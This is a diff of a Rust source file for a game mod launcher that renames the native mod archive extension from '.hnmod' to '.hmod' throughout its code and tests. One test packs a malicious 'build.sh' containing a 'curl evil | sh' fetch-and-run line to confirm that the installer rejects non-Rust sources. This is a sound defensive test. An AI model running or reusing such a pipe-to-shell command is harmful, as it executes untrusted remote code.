@@ -417,14 +417,14 @@ fn logged<T>(build: impl FnOnce() -> Result<T, String>) -> Result<T, String> {
 }
 
 const MANIFEST: &str = "horizon-mixin.toml";
-/// A registry download's manifest (`.hnmod`, `horizon_mods::index::native`), beside `mixins/<id>/`.
+/// A registry download's manifest (`.hmod`, `horizon_mods::index::native`), beside `mixins/<id>/`.
 const NATIVE_MANIFEST: &str = horizon_mods::index::native::MANIFEST;
-/// Where an instance keeps the native mods installed from the registry, `<id>.hnmod`, each on or
+/// Where an instance keeps the native mods installed from the registry, `<id>.hmod`, each on or
 /// off in `horizon-mods.txt` like any mod.
 pub const INSTALLED: &str = "horizon-native-mods";
 
 /// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
-/// Each `.hnmod` is checked again as the registry checks it (Rust and TOML under
+/// Each `.hmod` is checked again as the registry checks it (Rust and TOML under
 /// `mixins/<id>/`, plus files under its `data/`, nothing run).
 pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     let out = root().join("installed.incoming");
@@ -432,7 +432,7 @@ pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
         .map(|dir| dir.flatten().map(|e| e.path()).collect())
         .unwrap_or_default();
-    paths.retain(|p| p.extension().is_some_and(|e| e == "hnmod"));
+    paths.retain(|p| p.extension().is_some_and(|e| e == "hmod"));
     paths.sort();
     let mut count = 0;
     for path in paths {
@@ -464,11 +464,11 @@ pub struct Bundle {
     pub id: String,
     pub version: String,
     pub dir: PathBuf,
-    /// The Horizon commit it builds on (`[compatibility] horizon_revision`, or its `.hnmod`'s).
+    /// The Horizon commit it builds on (`[compatibility] horizon_revision`, or its `.hmod`'s).
     pub horizon: Option<String>,
-    /// The horizon-mixins commit it was tested with (its `.hnmod`'s).
+    /// The horizon-mixins commit it was tested with (its `.hmod`'s).
     pub mixins: Option<String>,
-    /// The native hook points' version it needs (its `.hnmod`'s `hooks`): then `horizon` is the
+    /// The native hook points' version it needs (its `.hmod`'s `hooks`): then `horizon` is the
     /// revision it was tested on, and it builds on any with these hook points or later ones.
     pub hooks: Option<u32>,
     /// The bundle-relative trait package folder (`[api] path`).
@@ -553,7 +553,7 @@ impl Injection {
 }
 
 /// The bundles in `folder`: the folder itself when it is one (a `horizon-mixin.toml`, or an
-/// unpacked `.hnmod`: `horizon-native.json` and `mixins/<id>/`), else each of its subfolders that is.
+/// unpacked `.hmod`: `horizon-native.json` and `mixins/<id>/`), else each of its subfolders that is.
 pub fn bundles(folder: &Path) -> Result<Vec<Bundle>, String> {
     if let Some(found) = bundle_in(folder)? {
         return Ok(vec![found]);
@@ -1249,7 +1249,7 @@ pub fn digest<'a>(files: impl Iterator<Item = (&'a str, &'a [u8])>) -> String {
 }
 
 /// The digest of a bundle's files as the Mods page reads it (`native_status::enabled`): an
-/// unpacked `.hnmod`'s whole folder, its `horizon-native.json` included, else the bundle's own
+/// unpacked `.hmod`'s whole folder, its `horizon-native.json` included, else the bundle's own
 /// folder. A build records it, so a build of the mods turned on reads as up to date.
 fn source_digest(bundle: &Bundle) -> Option<String> {
     let root = bundle
@@ -1261,7 +1261,7 @@ fn source_digest(bundle: &Bundle) -> Option<String> {
                 && bundle.dir == root.join("mixins").join(&bundle.id)
         })
         .unwrap_or(&bundle.dir);
-    // An installed .hnmod keeps its archive digest for the Mods page.
+    // An installed .hmod keeps its archive digest for the Mods page.
     let paths = if root == bundle.dir {
         bundle_files(bundle)
     } else {
@@ -2720,7 +2720,7 @@ mod tests {
     const A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
     const B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
 
-    /// An unpacked `.hnmod`, as the registry ships one (horizon_mods::index::native).
+    /// An unpacked `.hmod`, as the registry ships one (horizon_mods::index::native).
     fn write_native(at: &Path, id: &str, horizon: &str, mixins: &str) {
         let manifest = serde_json::json!({"schema": 1, "id": id, "version": "0.3.0", "game": "26.3",
             "horizon": horizon, "mixins": mixins});
@@ -2734,7 +2734,7 @@ mod tests {
 
     #[test]
     fn a_registry_download_is_a_bundle_with_its_pins() {
-        let d = dir("hnmod");
+        let d = dir("hmod");
         write_native(&d.join("veinminer"), "veinminer", A, B);
         write_bundle(&d.join("local"), "hello", "fn hook() {}");
         let found = bundles(&d).unwrap();
@@ -2769,7 +2769,7 @@ mod tests {
             }
             zip.finish().unwrap();
         };
-        pack("veinminer.hnmod", None);
+        pack("veinminer.hmod", None);
         assert!(installed_mods(&home).is_err(), "off until turned on");
         crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
         let out = installed_mods(&home).unwrap();
@@ -2794,7 +2794,7 @@ mod tests {
             "a build reads the digest before repinning its copy"
         );
         pack(
-            "veinminer.hnmod",
+            "veinminer.hmod",
             Some(("mixins/veinminer/data/table.bin", "data")),
         );
         let out = installed_mods(&home).unwrap();
@@ -2820,7 +2820,7 @@ mod tests {
             )
             .unwrap()
         );
-        pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
+        pack("veinminer.hmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
     }
 
